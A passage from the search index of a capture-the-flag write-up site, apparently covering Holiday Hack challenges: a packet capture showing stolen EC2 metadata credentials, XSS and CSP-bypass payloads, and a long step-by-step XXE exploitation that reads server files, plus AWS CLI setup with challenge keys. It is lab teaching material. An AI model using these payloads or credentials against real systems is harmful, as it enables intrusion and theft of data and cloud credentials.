Other Abbreviations"},{"location":"Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html#solve","text":"ANSWER: http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.4_IMDS_XXE_and_Other_Abbreviations.html#terminal-answers","text":"1.- See pcap filter by protocol observe in detail the request with HTTP/XML http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance GET /latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.0 Host: 169.254.169.254 Accept-Encoding: gzip HTTP/1.0 200 OK Accept-Ranges: bytes Content-Length: 1514 Content-Type: text/plain Date: Wed, 05 Oct 2022 16:48:57 GMT Last-Modified: Wed, 05 Oct 2022 16:42:35 GMT Connection: close Server: EC2ws { \"Code\" : \"Success\", \"LastUpdated\" : \"2022-10-05T16:43:21Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIAV4AVRXQVJ267LD2Q\", \"SecretAccessKey\" : \"OpGR4v70ygZ3RFf4WTzjNL45pQayRwZgBUgd0LJT\", \"Token\" : \"IQoJb3JpZ2luX2VjECEaCXVzLWVhc3QtMiJHMEUCIHDsZXiUuHIUrLNH5pAeMiv4aUMVIScjwbo1E9LctQ3rAiEA819eJ24mILbxM3eELK2xrgskHxsRmrza/jIj3y96/sgqsgQI2v//////////ARADGgw0MDM3NzIxMjgyOTgiDMAdG5EGamJ4Z2FwyiqGBPy+CL9AfXIGfLBBDCNkCyl5WOMN7owHr84k+hz4XZYBUp7/+KFZgEiKARroMuD6ofdNRvAj7dQ1/wFxeR6wezUPUkHqtc303oTBY7eTk5EQXClpKsmV1l25QAfD0DOL6FPxpjLPug0AbDFlIhjUeImvk3NBWiUHtXptrJH2ksSaQqU2DBPkkQ4IjMBMbLj0ZdJVWaiUy9sf5ecc2d/qVQU1c6SrYLg0HpyuH9brqm0zuv8/tR17Y/Jo2aNeNGX1wvyb5jP1FcQteypV6IqKIUUCADJ7chYeMypMlwV77phvrZco921O6MV+JlhSIomuzFRLdvzD+RP8DyLZeYZ65vKzr6h0yc+XIHOCT+P01pWQgfZBtvfCJKLKqwTMEbIr/i/xgGmHoCTzx6m38kd4EZvGXZMp3EEasdnqTtKLOR6JFAAlW8SoxOKRL1MshK3SUmYvWnMoLKCotPwyJeAMHEHuZipNMiZ2gbN//PMbUBnPjNVFBP4SfHaTv7EHzHNpTl5toy8qlPyxE0yLbh5a//DF5wJQE6UKfXWlQhk9/NVM7QAAzEzWPiFTp8ajRIDjPoprVlX3yUaTUHOH8PwMtURCJLl0sOQaJtRGWEMrH52ls5e83pm0ta8257vu8HyTR7zgc/7a0ZsoxetlsB7VYIKyXnETO7SMniTO8R/yE1Wn9qAoWp/jMPvn9pkGOo8CLegclGA49hB/LRr/V1bXEyIIRg5Zn93xXvccMX5QyKGVSRghNOVGn/cCglDWc9zSRFRlZ4tHblVi1v8021J04REPR69FDuVvpUzEDJfDF1u4XwYGsp7uuuIngiiegP56H5nSYjmpBfyIURwgNvsz6ptpUvplGCxOvBJcKeyborHJDKG40QRXsLpOgB8NTKhgaFNxO7PjA/YrT7g1rYS7xNrKzVIK4tTwxWB5zN5JAQ3pVRp2JB8Q1ng3qsj3UPfZ3O3JjY4U+rrBKPEHIw9B+Pz6kffOu73aPKgo333w/hd9U4slj74JQXPhO9jCYpAF1bLdS/If20Ed6HvGcAONep0A/FrtZ62EWX4HmeYZ4A==\", \"Expiration\" : \"2022-10-05T23:00:40Z\" ``` Extra info attacker: ```ruby POST /proc HTTP/1.1 Host: www.toteslegit.us User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.37) Gecko/20100101 Firefox/12.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Cookie: SiteCookie=eyJjb21wYW55IjoiTGVnaXRCcmVhZCIsImxldmVsIjoiYWRtaW4iLCJ1c2VyIjoiYm9iIn0.Yz21Ew.idT7R5CEcAB_uJD221WwmKYG5QM Content-Type: application/xml Content-Length: 146 <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]> <foo>&xxe;</foo> HTTP/1.1 200 OK Server: Werkzeug/2.2.2 Python/3.8.10 Date: Wed, 05 Oct 2022 16:48:32 GMT Content-Type: text/html; charset=utf-8 Content-Length: 1875 Connection: close <html><body> <pre><foo>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false </foo></pre> </body></html> attacker 18.222.86.32","title":"Terminal answers"},{"location":"Objectives/3_Recover_the_Web_Ring/3.5_Find_the_Next_Objective.html","text":"Recover the Web Ring 3.5 Find the Next Objective Talk to Alabaster Snowball for the next objective. Solve","title":"3.5 Find the Next Objective"},{"location":"Objectives/3_Recover_the_Web_Ring/3.5_Find_the_Next_Objective.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.5_Find_the_Next_Objective.html#35-find-the-next-objective","text":"Talk to Alabaster Snowball for the next objective.","title":"3.5 Find the Next Objective"},{"location":"Objectives/3_Recover_the_Web_Ring/3.5_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html","text":"Recover the Web Ring 3.6 Open Boria Mine Door Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge. Hint(s) Solve Terminal answers 1.- Solve: see the source code, there is a comment as hint. Payload: @&@&&W&&W&&&& 2.- Solve: See the source code, there is a comment as hint use it to bypass the CSP filter OUT HTML Payload: <META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\"> 3.- Solve: see the source code, there is a comment as hint use it to byppass the CSP filter OUT Javascript Payload: <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"border:1px solid #ddd;\" width=\"300\" height=\"300\" viewBox=\"0 -5 90 40\"> <path d=\"M 0 0 L 100 -40\" stroke=\"blue\" stroke-width=\"10\"/> </svg>","title":"3.6 Open Boria Mine Door"},{"location":"Objectives/3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html#36-open-boria-mine-door","text":"Open the door to the Boria Mines. Help Alabaster Snowball in the Web Ring to get some hints for this challenge.","title":"3.6 Open Boria Mine Door"},{"location":"Objectives/3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html#solve","text":"","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.6_Open_Boria_Mine_Door.html#terminal-answers","text":"1.- Solve: see the source code, there is a comment as hint. Payload: @&@&&W&&W&&&& 2.- Solve: See the source code, there is a comment as hint use it to bypass the CSP filter OUT HTML Payload: <META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\"> 3.- Solve: see the source code, there is a comment as hint use it to byppass the CSP filter OUT Javascript Payload: <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"border:1px solid #ddd;\" width=\"300\" height=\"300\" viewBox=\"0 -5 90 40\"> <path d=\"M 0 0 L 100 -40\" stroke=\"blue\" stroke-width=\"10\"/> </svg>","title":"Terminal answers"},{"location":"Objectives/3_Recover_the_Web_Ring/3.7_Find_the_Next_Objective.html","text":"Recover the Web Ring 3.7 Find the Next Objective Talk to Hal Tandybuck for the next objective. Solve","title":"3.7 Find the Next Objective"},{"location":"Objectives/3_Recover_the_Web_Ring/3.7_Find_the_Next_Objective.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.7_Find_the_Next_Objective.html#37-find-the-next-objective","text":"Talk to Hal Tandybuck for the next objective.","title":"3.7  Find the Next Objective"},{"location":"Objectives/3_Recover_the_Web_Ring/3.7_Find_the_Next_Objective.html#solve","text":"","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html","text":"Recover the Web Ring 3.8 Glamtariel's Fountain Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints. Hint(s) Solve ANSWER: goldring-morethansupertopsecret76394734.png Terminal answers 1.- Do a \"Drag and Drop\" for all the the items to Glamtariel and fountain images. 2.- Keep attention through the dialogs and catch all the CAPITALIZE WORDS , those will be give us a clearly hint to solve the challenge. My capitalize words list: TAMPER | TRAFFIC FLIES : A hint to tampper the data sending through POST/GET methods. TYPE : A hint to modify the Content-Type to exploit the vulnerability. RINGLIST : A hint find the file through the exploitation and must be simple e.g ringlist.txt acording to Glamtariel's dialogs. APP | PATH : A hint regarding the default path where docker deploy the APP, this will give us an idea from where is the flag. 3.- Continue doing \"Drag and Drop\" for all items until get the blue rings, the silver and red. 4.- See the Glamtariel dialog \"You know what one of my favorite songs is? Silver rings, silver rings...\" <-- see another clear hint. 5.- Do a \"Drag and Drop\" and catch the Silver Ring traffic with burp suite. POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/json {\"imgDrop\":\"img2\",\"who\":\"princess\",\"reqType\":\"json\"} 6.- Change the Content-Type header to use XML and change JSON arguments by XML format , send the new POST through webproxy. POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/xml <--HERE! <?xml version=\"1.0\" encoding=\"UTF-8\"?> <root> <imgDrop>img2</imgDrop> <who>fountain</who> <reqType>xml</reqType> </root> 7.- See the reponse from the server on specific the \"appResp\" values. I'm one of the few who can discuss anything using that TYPE of language.^Yeah, I can understand a bit, but not communicate with it at all 8.- Send a new POST payload but now changing the XML \"<who>\" value by princess POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/xml <?xml version=\"1.0\" encoding=\"UTF-8\"?> <root> <imgDrop>img1</imgDrop> <who>princess</who> <--HERE! <reqType>xml</reqType> </root> 9.- See the reponse from server , on specific the \"<appResp>\" value. I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. 10.- On this phase the XML arguments \"<imgDrop>\" and \"<who>\" any value injected are accepted by server side, the last argument \"<reqType>\" if we changed the value we received an error or if the XML format is not the correct as well. Sorry, I don't quite understand what you were trying to share. I know many languages but use only a few. Did you forget a root for the language or something else perhaps? It could be that I don't know anything about that also.^Sorry, I didn't understand. I typically only use one TYPE of language 11.- Same case, if we try to change the format before get the Silver Ring we see the following message: Zoom, Zoom, very hasty, can't do that yet!^Zoom, Zoom, very hasty, can't do that yet!\" 12.- Time to Inject the XXE payloads, notice the server don't offer any clue to read local files to see where we are into server directories. POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/xml <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE replace [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <root> <foo>&xxe;</foo> <imgDrop>&xxe;</imgDrop> <who>fountain</who> <reqType>xml</reqType> </root> 13.- Through all the process the server response on visit argument mostly with none value but in specific cases as \"TAMPER error\" was included the PATH to see an image. HTTP/2 200 OK Server: Werkzeug/2.2.2 Python/3.10.8 [../snip] { \"appResp\": \"Trying to TAMPER with Kringle's favorite cookie recipe or the entrance tickets can't help you Grinchum! I'm not sure what you are looking for but it isn't here! Get out!^Miserable trickster! Please click him out of here.\", \"droppedOn\": \"none\", \"visit\": \"static/images/grinchum-supersecret_9364274.png,265px,135px\" <-- HERE! } 14.- After spent some long hours at nite and very frustrating, finally we guess the correct path to call the file /app/static/images/ringlist.txt . XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/ringlist.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Response: { \"appResp\": \"Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)\", \"droppedOn\": \"none\", \"visit\": \"static/images/pholder-morethantopsupersecret63842.png,262px,100px\" } Consult the image: https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png The image shows the folder name and files to call. PATH: /x_phial_pholder_2022/bluering.txt PATH: /x_phial_pholder_2022/redring.txt 15.- Knowing that we need to call a ring by colors the list should be the follow through XXE exploitation: PATH: /x_phial_pholder_2022/bluering.txt PATH: /x_phial_pholder_2022/redring.txt PATH: /x_phial_pholder_2022/greenring.txt PATH: /x_phial_pholder_2022/silverring.txt <-- HERE!! PATH: /x_phial_pholder_2022/goldring.txt 16.- The most important data to get the flag is the silverring.txt XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/silverring.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Response: { \"appResp\": \"I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px\" } Consult the image: https://glamtarielsfountain.com/static/images/redring-supersupersecret928164.png The image shows a new file to call. PATH: /x_phial_pholder_2022/goldring_to_be_deleted.txt 17.- Now call the file /x_phial_pholder_2022/goldring_to_be_deleted.txt through XXE exploitation: XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Response: { \"appResp\": \"Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.\", \"droppedOn\": \"none\", \"visit\": \"none\" } See that nothing happened, this time we need to move the XXE injection to XML <reqType> argument 18.- Final step, call the file /x_phial_pholder_2022/goldring_to_be_deleted.txt through the argument <reqType> XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>img1</imgDrop> <who>princess</who> <reqType>&xxe;</reqType> <--HERE! </root> Response: { \"appResp\": \"No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px\" } Consult the image: https://glamtarielsfountain.com/static/images/goldring-morethansupertopsecret76394734.png The image shows Golden Ring goldring-morethansupertopsecret76394734.png <-- Voila!, FLAG!","title":"3.8 Glamtariel's Fountain"},{"location":"Objectives/3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html#recover-the-web-ring","text":"","title":"Recover the Web Ring"},{"location":"Objectives/3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html#38-glamtariels-fountain","text":"Stare into Glamtariel's fountain and see if you can find the ring! What is the filename of the ring she presents you? Talk to Hal Tandybuck in the Web Ring for hints.","title":"3.8 Glamtariel's Fountain"},{"location":"Objectives/3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html#solve","text":"ANSWER: goldring-morethansupertopsecret76394734.png","title":"Solve"},{"location":"Objectives/3_Recover_the_Web_Ring/3.8_Glamtariel_s_Fountain.html#terminal-answers","text":"1.- Do a \"Drag and Drop\" for all the the items to Glamtariel and fountain images. 2.- Keep attention through the dialogs and catch all the CAPITALIZE WORDS , those will be give us a clearly hint to solve the challenge. My capitalize words list: TAMPER | TRAFFIC FLIES : A hint to tampper the data sending through POST/GET methods. TYPE : A hint to modify the Content-Type to exploit the vulnerability. RINGLIST : A hint find the file through the exploitation and must be simple e.g ringlist.txt acording to Glamtariel's dialogs. APP | PATH : A hint regarding the default path where docker deploy the APP, this will give us an idea from where is the flag. 3.- Continue doing \"Drag and Drop\" for all items until get the blue rings, the silver and red. 4.- See the Glamtariel dialog \"You know what one of my favorite songs is? Silver rings, silver rings...\" <-- see another clear hint. 5.- Do a \"Drag and Drop\" and catch the Silver Ring traffic with burp suite. POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/json {\"imgDrop\":\"img2\",\"who\":\"princess\",\"reqType\":\"json\"} 6.- Change the Content-Type header to use XML and change JSON arguments by XML format , send the new POST through webproxy. POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/xml <--HERE! <?xml version=\"1.0\" encoding=\"UTF-8\"?> <root> <imgDrop>img2</imgDrop> <who>fountain</who> <reqType>xml</reqType> </root> 7.- See the reponse from the server on specific the \"appResp\" values. I'm one of the few who can discuss anything using that TYPE of language.^Yeah, I can understand a bit, but not communicate with it at all 8.- Send a new POST payload but now changing the XML \"<who>\" value by princess POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/xml <?xml version=\"1.0\" encoding=\"UTF-8\"?> <root> <imgDrop>img1</imgDrop> <who>princess</who> <--HERE! <reqType>xml</reqType> </root> 9.- See the reponse from server , on specific the \"<appResp>\" value. I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though. 10.- On this phase the XML arguments \"<imgDrop>\" and \"<who>\" any value injected are accepted by server side, the last argument \"<reqType>\" if we changed the value we received an error or if the XML format is not the correct as well. Sorry, I don't quite understand what you were trying to share. I know many languages but use only a few. Did you forget a root for the language or something else perhaps? It could be that I don't know anything about that also.^Sorry, I didn't understand. I typically only use one TYPE of language 11.- Same case, if we try to change the format before get the Silver Ring we see the following message: Zoom, Zoom, very hasty, can't do that yet!^Zoom, Zoom, very hasty, can't do that yet!\" 12.- Time to Inject the XXE payloads, notice the server don't offer any clue to read local files to see where we are into server directories. POST /dropped HTTP/2 Host: glamtarielsfountain.com Cookie: GCLB=\"9d99dd148f14d5ca\"; MiniLembanh=99eb6d49-fc8c-4aa5-8e73-a8013a8e97fa.BUIEOhG5Bz2f0vauCs7uKxoE-I0 Content-Length: 52 Accept: application/json Content-Type: application/xml <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE replace [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <root> <foo>&xxe;</foo> <imgDrop>&xxe;</imgDrop> <who>fountain</who> <reqType>xml</reqType> </root> 13.- Through all the process the server response on visit argument mostly with none value but in specific cases as \"TAMPER error\" was included the PATH to see an image. HTTP/2 200 OK Server: Werkzeug/2.2.2 Python/3.10.8 [../snip] { \"appResp\": \"Trying to TAMPER with Kringle's favorite cookie recipe or the entrance tickets can't help you Grinchum! I'm not sure what you are looking for but it isn't here! Get out!^Miserable trickster! Please click him out of here.\", \"droppedOn\": \"none\", \"visit\": \"static/images/grinchum-supersecret_9364274.png,265px,135px\" <-- HERE! } 14.- After spent some long hours at nite and very frustrating, finally we guess the correct path to call the file /app/static/images/ringlist.txt . XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/ringlist.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Response: { \"appResp\": \"Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)\", \"droppedOn\": \"none\", \"visit\": \"static/images/pholder-morethantopsupersecret63842.png,262px,100px\" } Consult the image: https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png The image shows the folder name and files to call. PATH: /x_phial_pholder_2022/bluering.txt PATH: /x_phial_pholder_2022/redring.txt 15.- Knowing that we need to call a ring by colors the list should be the follow through XXE exploitation: PATH: /x_phial_pholder_2022/bluering.txt PATH: /x_phial_pholder_2022/redring.txt PATH: /x_phial_pholder_2022/greenring.txt PATH: /x_phial_pholder_2022/silverring.txt <-- HERE!! PATH: /x_phial_pholder_2022/goldring.txt 16.- The most important data to get the flag is the silverring.txt XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/silverring.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Response: { \"appResp\": \"I'd so love to add that silver ring to my collection, but what's this? Someone has defiled my red ring! Click it out of the way please!.^Can't say that looks good. Someone has been up to no good. Probably that miserable Grinchum!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px\" } Consult the image: https://glamtarielsfountain.com/static/images/redring-supersupersecret928164.png The image shows a new file to call. PATH: /x_phial_pholder_2022/goldring_to_be_deleted.txt 17.- Now call the file /x_phial_pholder_2022/goldring_to_be_deleted.txt through XXE exploitation: XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>&xxe;</imgDrop> <who>princess</who> <reqType>xml</reqType> </root> Response: { \"appResp\": \"Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you've made a pretty bold REQuest. That's ok, but even if I knew anything about such things, I'd only use a secret TYPE of tongue to discuss them.^She's definitely hiding something.\", \"droppedOn\": \"none\", \"visit\": \"none\" } See that nothing happened, this time we need to move the XXE injection to XML <reqType> argument 18.- Final step, call the file /x_phial_pholder_2022/goldring_to_be_deleted.txt through the argument <reqType> XXE Payload: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt\"> ]> <root> <imgDrop>img1</imgDrop> <who>princess</who> <reqType>&xxe;</reqType> <--HERE! </root> Response: { \"appResp\": \"No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!\", \"droppedOn\": \"none\", \"visit\": \"static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px\" } Consult the image: https://glamtarielsfountain.com/static/images/goldring-morethansupertopsecret76394734.png The image shows Golden Ring goldring-morethansupertopsecret76394734.png <-- Voila!, FLAG!","title":"Terminal answers"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html","text":"Recover the Cloud Ring 4.1 AWS CLI Intro Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints. Hint(s) Solve $ aws sts get-caller-identity Terminal answers $ aws help reat! When you're done, you can quit with q. Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 . https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config access key AKQAAYRKO7A5Q5XUY2IY, secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf Region us-east-1 Format: json elf@3298c5df39c5:~$ aws sts get-caller-identity An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation: The security token included in the request is invalid. elf@3298c5df39c5:~$ vim .aws/config elf@3298c5df39c5:~$ vim .aws/credentials elf@3298c5df39c5:~$ aws sts get-caller-identity { \"UserId\": \"AKQAAYRKO7A5Q5XUY2IY\", \"Account\": \"602143214321\", \"Arn\": \"arn:aws:iam::602143214321:user/elf_helpdesk\" } elf@3298c5df39c5:~$","title":"4.1 AWS CLI_Intro"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html#recover-the-cloud-ring","text":"","title":"Recover the Cloud Ring"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html#41-aws-cli-intro","text":"Try out some basic AWS command line skills in this terminal. Talk to Jill Underpole in the Cloud Ring for hints.","title":"4.1 AWS CLI Intro"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html#hints","text":"","title":"Hint(s)"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html#solve","text":"$ aws sts get-caller-identity","title":"Solve"},{"location":"Objectives/4_Recover_the_Cloud_Ring/4.1_AWS_CLI_Intro.html#terminal-answers","text":"$ aws help reat! When you're done, you can quit with q. Next, please configure the default aws cli credentials with the access key AKQAAYRKO7A5Q5XUY2IY, the secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1 . https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config access key AKQAAYRKO7A5Q5XUY2IY, secret key qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf Region us-east-1 Format: json elf@3298c5df39c5:~$ aws sts 